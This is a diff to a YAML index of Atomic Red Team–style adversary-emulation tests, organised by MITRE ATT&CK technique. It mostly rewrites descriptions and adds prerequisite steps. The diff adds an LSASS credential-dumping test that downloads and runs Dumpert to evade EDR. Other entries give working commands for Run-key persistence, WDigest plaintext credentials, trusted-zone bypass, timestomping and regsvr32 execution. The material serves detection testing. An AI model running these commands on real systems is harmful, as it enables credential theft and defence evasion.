@@ -1617,34 +1617,53 @@ persistence:
 
 '
     - name: Create Windows System File with Attrib
-      description: 'Creates a file and marks it as a system file using the attrib.exe
-        utility.
-
-'
+      description: |
+        Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details
+        and observe that the Attributes are "SA" for System and Archive.
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_modify:
+          description: File to modify using Attrib command
+          type: string
+          default: "%temp%\\T1158.txt"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_to_modify})
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo system_Attrib_T1158 >> #{file_to_modify}'
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          echo T1158 > %TEMP%\T1158.txt
-          attrib.exe +s %TEMP%\T1158.txt
-        cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
+        command: 'attrib.exe +s #{file_to_modify}
+
+'
+        cleanup_command: 'del /A:S #{file_to_modify} >nul 2>&1
 
 '
     - name: Create Windows Hidden File with Attrib
-      description: 'Creates a file and marks it as hidden using the attrib.exe utility.
-
-'
+      description: |
+        Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file
+        and observe that the Attributes are "SH" for System and Hidden.
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_modify:
+          description: File to modify using Attrib command
+          type: string
+          default: "%temp%\\T1158.txt"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_to_modify})
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo system_Attrib_T1158 >> #{file_to_modify}'
       executor:
         name: command_prompt
-        elevation_required: false
-        command: |
-          echo T1158_hidden > %TEMP%\T1158_hidden.txt
-          attrib.exe +h %TEMP%\T1158_hidden.txt
-        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
+        elevation_required: true
+        command: 'attrib.exe +h #{file_to_modify}
+
+'
+        cleanup_command: 'del /A:H #{file_to_modify} >nul 2>&1
 
 '
     - name: Hidden files
@@ -1695,47 +1714,54 @@ persistence:
 
 '
     - name: Create ADS command prompt
-      description: 'Create an Alternate Data Stream with the command prompt. Write
-        access is required.
-
-'
+      description: |
+        Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run "dir /a-d /s /r | find ":$DATA"" in the %temp%
+        folder to view that the alternate data stream exists. To view the data in the alternate data stream, run "notepad T1158_has_ads.txt:adstest.txt"
       supported_platforms:
       - windows
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
           type: string
-          default: test.txt
+          default: "%temp%\\T1158_has_ads_cmd.txt"
         ads_filename:
           description: Name of ADS file.
           type: string
           default: adstest.txt
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_name})
+        prereq_command: 'IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo normal_text >> #{file_name} >nul 2>&1'
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
           for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
         cleanup_command: 'del #{file_name} >nul 2>&1
 
 '
     - name: Create ADS PowerShell
-      description: 'Create an Alternate Data Stream with PowerShell. Write access
-        is required.
-
-'
+      description: |
+        Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
+        in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1158_has_ads_powershell.txt:adstest.txt" in the %temp% folder.
       supported_platforms:
       - windows
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
           type: string
-          default: test.txt
+          default: "$env:TEMP\\T1158_has_ads_powershell.txt"
         ads_filename:
           description: Name of ADS file.
           type: string
           default: adstest.txt
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_name})
+        prereq_command: 'if (Test-Path #{file_name}) { exit 0 } else { exit 1 }'
+        get_prereq_command: 'New-Item -Path #{file_name} | Out-Null'
       executor:
         name: powershell
         elevation_required: false
@@ -1743,7 +1769,6 @@ persistence:
           echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
           set-content -path #{file_name} -stream #{ads_filename} -value "test2"
           set-content -path . -stream #{ads_filename} -value "test3"
-          ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
         cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
 '
@@ -8144,34 +8169,53 @@ defense-evasion:
 
 '
     - name: Create Windows System File with Attrib
-      description: 'Creates a file and marks it as a system file using the attrib.exe
-        utility.
-
-'
+      description: |
+        Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details
+        and observe that the Attributes are "SA" for System and Archive.
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_modify:
+          description: File to modify using Attrib command
+          type: string
+          default: "%temp%\\T1158.txt"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_to_modify})
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo system_Attrib_T1158 >> #{file_to_modify}'
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          echo T1158 > %TEMP%\T1158.txt
-          attrib.exe +s %TEMP%\T1158.txt
-        cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
+        command: 'attrib.exe +s #{file_to_modify}
+
+'
+        cleanup_command: 'del /A:S #{file_to_modify} >nul 2>&1
 
 '
     - name: Create Windows Hidden File with Attrib
-      description: 'Creates a file and marks it as hidden using the attrib.exe utility.
-
-'
+      description: |
+        Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file
+        and observe that the Attributes are "SH" for System and Hidden.
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_modify:
+          description: File to modify using Attrib command
+          type: string
+          default: "%temp%\\T1158.txt"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_to_modify})
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo system_Attrib_T1158 >> #{file_to_modify}'
       executor:
         name: command_prompt
-        elevation_required: false
-        command: |
-          echo T1158_hidden > %TEMP%\T1158_hidden.txt
-          attrib.exe +h %TEMP%\T1158_hidden.txt
-        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
+        elevation_required: true
+        command: 'attrib.exe +h #{file_to_modify}
+
+'
+        cleanup_command: 'del /A:H #{file_to_modify} >nul 2>&1
 
 '
     - name: Hidden files
@@ -8222,47 +8266,54 @@ defense-evasion:
 
 '
     - name: Create ADS command prompt
-      description: 'Create an Alternate Data Stream with the command prompt. Write
-        access is required.
-
-'
+      description: |
+        Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run "dir /a-d /s /r | find ":$DATA"" in the %temp%
+        folder to view that the alternate data stream exists. To view the data in the alternate data stream, run "notepad T1158_has_ads.txt:adstest.txt"
       supported_platforms:
       - windows
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
           type: string
-          default: test.txt
+          default: "%temp%\\T1158_has_ads_cmd.txt"
         ads_filename:
           description: Name of ADS file.
           type: string
           default: adstest.txt
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_name})
+        prereq_command: 'IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: 'echo normal_text >> #{file_name} >nul 2>&1'
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
           for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
         cleanup_command: 'del #{file_name} >nul 2>&1
 
 '
     - name: Create ADS PowerShell
-      description: 'Create an Alternate Data Stream with PowerShell. Write access
-        is required.
-
-'
+      description: |
+        Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
+        in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1158_has_ads_powershell.txt:adstest.txt" in the %temp% folder.
       supported_platforms:
       - windows
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
           type: string
-          default: test.txt
+          default: "$env:TEMP\\T1158_has_ads_powershell.txt"
         ads_filename:
           description: Name of ADS file.
           type: string
           default: adstest.txt
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The file must exist on disk at specified location (#{file_name})
+        prereq_command: 'if (Test-Path #{file_name}) { exit 0 } else { exit 1 }'
+        get_prereq_command: 'New-Item -Path #{file_name} | Out-Null'
       executor:
         name: powershell
         elevation_required: false
@@ -8270,7 +8321,6 @@ defense-evasion:
           echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
           set-content -path #{file_name} -stream #{ads_filename} -value "test2"
           set-content -path . -stream #{ads_filename} -value "test3"
-          ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
         cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
 '
@@ -9942,10 +9992,9 @@ defense-evasion:
       identifier: T1112
     atomic_tests:
     - name: Modify Registry of Current User Profile - cmd
-      description: 'Modify the registry of the currently logged in user using reg.exe
-        cia cmd console
-
-'
+      description: |
+        Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message "The operation completed successfully."
+        will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
       supported_platforms:
       - windows
       executor:
@@ -9962,88 +10011,31 @@ defense-evasion:
     - name: Modify Registry of Local Machine - cmd
       description: |
         Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
-        CMD is ran as Administrative rights.
+        CMD is ran as Administrative rights. Upon execution, the message "The operation completed successfully."
+        will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
       supported_platforms:
       - windows
+      input_arguments:
+        new_executable:
+          description: New executable to run on startup instead of Windows Defender
+          type: string
+          default: calc.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
-          /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
+          /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
 
 '
         cleanup_command: 'reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /v SecurityHealth /f
 
 '
-    - name: Modify Registry of Another User Profile
-      description: 'Modify a registry key of each user profile not currently loaded
-        on the machine using both powershell and cmd line tools.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          # here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.
-          # Here we can load all unloaded user hives and do whatever we want in the location below (comments)
-          $PatternSID = 'S-1-5-21-\d+-\d+\-\d+\-\d+$'
-
-          Write-Verbose -Message 'Gathering Profile List and loading their registry hives'
-          # Get Username, SID, and location of ntuser.dat for all users
-
-          $ProfileList = @()
-          $ProfileList = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | Where-Object { $_.PSChildName -match $PatternSID } |
-            Select  @{ name = "SID"; expression = { $_.PSChildName } },
-                    @{ name = "UserHive"; expression = { "$($_.ProfileImagePath)\ntuser.dat" } },
-                    @{ name = "Username"; expression = { $_.ProfileImagePath -replace '^(.*[\\\/])', '' } }
-
-          # Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)
-          $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = "SID"; expression = { $_.PSChildName } }
-
-          $SIDObject = @()
-
-          foreach ($item in $LoadedHives)
-          {
-              $props = @{
-                  SID = $item.SID
-              }
-
-              $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props
-              $SIDObject += $TempSIDObject
-          }
-
-          # We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2
-          # if the count is less than 2 it doesn't work. :)
-          for ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)
-          {
-              for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)
-              {
-                  if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))
-                  {
-                      $UnloadedHives += $ProfileList[$p].SID
-                      Write-Verbose -Message "Loading Registry hives for $($ProfileList[$p].SID)"
-                      reg load "HKU\$($ProfileList[$p].SID)" "$($ProfileList[$p].UserHive)"
-
-                      Write-Verbose -Message 'Attempting to modify registry keys for each profile'
-                      #####################################################################
-                      reg add "HKEY_CURRENT_USER\$($ProfileList[$p].SID)\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v HideFileExt /d 1 /f
-                  }
-              }
-          }
-
-          Write-Verbose 'Unloading Registry hives for all users'
-          # Unload ntuser.dat
-          ### Garbage collection and closing of ntuser.dat ###
-          [gc]::Collect()
-          reg unload "HKU\$($ProfileList[$p].SID)"
     - name: Modify registry to store logon credentials
-      description: 'Sets registry key that will tell windows to store plaintext passwords
-        (making the system vulnerable to clear text / cleartext password dumping)
-
-'
+      description: |
+        Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
+        Upon execution, the message "The operation completed successfully." will be displayed.
+        Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
       supported_platforms:
       - windows
       executor:
@@ -10057,63 +10049,37 @@ defense-evasion:
           /v UseLogonCredential /t REG_DWORD /d 0 /f
 
 '
-    - name: Modify registry to store PowerShell code
-      description: 'Sets Windows Registry key containing base64-encoded PowerShell
-        code.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        powershell_command:
-          description: PowerShell command to encode
-          type: String
-          default: Write-Host "Hey, Atomic!"
-        registry_key_storage:
-          description: Windows Registry Key to store code
-          type: String
-          default: HKCU:Software\Microsoft\Windows\CurrentVersion
-        registry_entry_storage:
-          description: Windows Registry entry to store code under key
-          type: String
-          default: Debug
-      executor:
-        name: powershell
-        elevation_required: false
-        command: |
-          $OriginalCommand = '#{powershell_command}'
-          $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
-          $EncodedCommand =[Convert]::ToBase64String($Bytes)
-          $EncodedCommand
-          Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
-        cleanup_command: 'Remove-ItemProperty -Force -Path #{registry_key_storage}
-          -Name #{registry_entry_storage} -ErrorAction Ignore
-
-'
     - name: Add domain to Trusted sites Zone
       description: |
-        Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365 as described here:
+        Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
+        Upon execution, details of the new registry entries will be displayed.
+        Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.
+
         https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
       supported_platforms:
       - windows
+      input_arguments:
+        bad_domain:
+          description: Domain to add to trusted site zone
+          type: String
+          default: bad-domain.com
       executor:
         name: powershell
         elevation_required: false
         command: |
-          $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
+          $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
           $name ="bad-subdomain"
           new-item $key -Name $name -Force
           new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
           new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
           new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
         cleanup_command: |
-          $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
+          $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
           Remove-item  $key -Recurse -ErrorAction Ignore
     - name: Javascript in registry
-      description: 'Upon execution, a javascript block will be placed in the registry
-        for persistence
-
-'
+      description: |
+        Upon execution, a javascript block will be placed in the registry for persistence.
+        Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
       supported_platforms:
       - windows
       executor:
@@ -11301,7 +11267,8 @@ defense-evasion:
       identifier: T1121
     atomic_tests:
     - name: Regasm Uninstall Method Call Test
-      description: 'Executes the Uninstall Method, No Admin Rights Required
+      description: 'Executes the Uninstall Method, No Admin Rights Required. Upon
+        execution, "I shouldn''t really execute either." will be displayed.
 
 '
       supported_platforms:
@@ -11333,10 +11300,9 @@ defense-evasion:
 
 '
     - name: Regsvs Uninstall Method Call Test
-      description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
-        SNK
-
-'
+      description: |
+        Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, "I shouldn't really execute" will be displayed
+        along with other information about the assembly being installed.
       supported_platforms:
       - windows
       input_arguments:
@@ -11442,7 +11408,7 @@ defense-evasion:
     atomic_tests:
     - name: Regsvr32 local COM scriptlet execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
+        OLE controls. Upon execution, calc.exe will be launched.
 
 '
       supported_platforms:
@@ -11466,10 +11432,9 @@ defense-evasion:
 
 '
     - name: Regsvr32 remote COM scriptlet execution
-      description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
-
-'
+      description: |
+        Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
+        windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -11485,7 +11450,7 @@ defense-evasion:
 '
     - name: Regsvr32 local DLL execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
+        OLE controls. Upon execution, calc.exe will be launched.
 
 '
       supported_platforms:
@@ -12531,80 +12496,103 @@ defense-evasion:
 '
     - name: Windows - Modify file creation timestamp with PowerShell
       description: |
-        Modifies the file creation timestamp of a specified file.
-
-        This technique was seen in use by the Stitch RAT.
+        Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+        To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.
       supported_platforms:
       - windows
       input_arguments:
         file_path:
           description: Path of file to change creation timestamp
           type: Path
-          default: "$env:APPDATA\\atomic.txt"
+          default: "$env:TEMP\\T1099_timestomp.txt"
         target_date_time:
           description: Date/time to replace original timestamps with
           type: String
           default: '1970-01-01 00:00:00'
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A file must exist at the path (#{file_path}) to change the creation
+          time on
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Path #{file_path} -Force | Out-Null
+          Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          New-Item #{file_path} -Force
-          Set-Content #{file_path} -Value "atomic test" -Force
-          Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }
-        cleanup_command: 'Remove-Item #{file_path} -Force
+        command: 'Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}"
+          }
+
+'
+        cleanup_command: 'Remove-Item #{file_path} -Force -ErrorAction Ignore
 
 '
     - name: Windows - Modify file last modified timestamp with PowerShell
       description: |
-        Modifies the file last modified timestamp of a specified file.
-
-        This technique was seen in use by the Stitch RAT.
+        Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+        To verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.
       supported_platforms:
       - windows
       input_arguments:
         file_path:
-          description: Path of file to change last modified timestamp
+          description: Path of file to change modified timestamp
           type: Path
-          default: "$env:APPDATA\\atomic.txt"
+          default: "$env:TEMP\\T1099_timestomp.txt"
         target_date_time:
           description: Date/time to replace original timestamps with
           type: String
           default: '1970-01-01 00:00:00'
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A file must exist at the path (#{file_path}) to change the modified
+          time on
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Path #{file_path} -Force | Out-Null
+          Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          New-Item #{file_path} -Force
-          Set-Content #{file_path} -Value "atomic test" -Force
-          Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }
-        cleanup_command: 'Remove-Item #{file_path} -Force
+        command: 'Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}"
+          }
+
+'
+        cleanup_command: 'Remove-Item #{file_path} -Force -ErrorAction Ignore
 
 '
     - name: Windows - Modify file last access timestamp with PowerShell
       description: |
-        Modifies the last access timestamp of a specified file.
-
-        This technique was seen in use by the Stitch RAT.
+        Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+        To verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.
       supported_platforms:
       - windows
       input_arguments:
         file_path:
           description: Path of file to change last access timestamp
           type: Path
-          default: "$env:APPDATA\\atomic.txt"
+          default: "$env:TEMP\\T1099_timestomp.txt"
         target_date_time:
           description: Date/time to replace original timestamps with
           type: String
           default: '1970-01-01 00:00:00'
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A file must exist at the path (#{file_path}) to change the last
+          access time on
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Path #{file_path} -Force | Out-Null
+          Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          New-Item #{file_path} -Force
-          Set-Content #{file_path} -Value "atomic test" -Force
-          Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }
-        cleanup_command: 'Remove-Item #{file_path} -Force'
+        command: 'Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}"
+          }
+
+'
+        cleanup_command: 'Remove-Item #{file_path} -Force -ErrorAction Ignore
+
+'
   T1127:
     technique:
       x_mitre_data_sources:
@@ -20116,6 +20104,34 @@ credential-access:
         cleanup_command: 'Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
 
 '
+    - name: Dump LSASS.exe Memory using direct system calls and API unhooking
+      description: "The memory of lsass.exe is often dumped for offline credential
+        theft attacks. This can be achieved using direct system calls and API unhooking
+        in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon
+        successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.\n\nIf
+        you see a message saying \"The system cannot find the path specified.\", try
+        using the  get-prereq_commands to download the  tool first.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        dumpert_exe:
+          description: Path of Dumpert executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\Outflank-Dumpert.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})
+        prereq_command: 'if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
+          Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
+      executor:
+        elevation_required: true
+        name: command_prompt
+        command: "#{dumpert_exe}\n"
+        cleanup_command: 'del C:\windows\temp\dumpert.dmp >nul 2> nul
+
+'
     - name: Dump LSASS.exe Memory using Windows Task Manager
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
@@ -23398,7 +23414,8 @@ execution:
       identifier: T1121
     atomic_tests:
     - name: Regasm Uninstall Method Call Test
-      description: 'Executes the Uninstall Method, No Admin Rights Required
+      description: 'Executes the Uninstall Method, No Admin Rights Required. Upon
+        execution, "I shouldn''t really execute either." will be displayed.
 
 '
       supported_platforms:
@@ -23430,10 +23447,9 @@ execution:
 
 '
     - name: Regsvs Uninstall Method Call Test
-      description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
-        SNK
-
-'
+      description: |
+        Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, "I shouldn't really execute" will be displayed
+        along with other information about the assembly being installed.
       supported_platforms:
       - windows
       input_arguments:
@@ -23539,7 +23555,7 @@ execution:
     atomic_tests:
     - name: Regsvr32 local COM scriptlet execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
+        OLE controls. Upon execution, calc.exe will be launched.
 
 '
       supported_platforms:
@@ -23563,10 +23579,9 @@ execution:
 
 '
     - name: Regsvr32 remote COM scriptlet execution
-      description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
-
-'
+      description: |
+        Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
+        windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -23582,7 +23597,7 @@ execution:
 '
     - name: Regsvr32 local DLL execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
-        OLE controls
+        OLE controls. Upon execution, calc.exe will be launched.
 
 '
       supported_platforms:
